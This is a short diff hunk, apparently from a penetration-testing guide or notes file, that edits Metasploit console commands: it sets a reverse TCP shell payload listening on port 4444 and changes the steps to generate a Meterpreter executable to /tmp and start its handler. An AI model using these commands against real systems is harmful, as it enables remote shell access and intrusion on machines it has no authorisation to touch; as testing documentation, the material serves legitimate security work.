@@ -58,7 +58,9 @@ set PAYLOAD generic/shell_reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 4444
 set ExitOnSession false
-exploit -j
+
+generate -o /tmp/meterpreter.exe -f exe
+to_handler
 
 [ctrl+a] + [d]
 ```
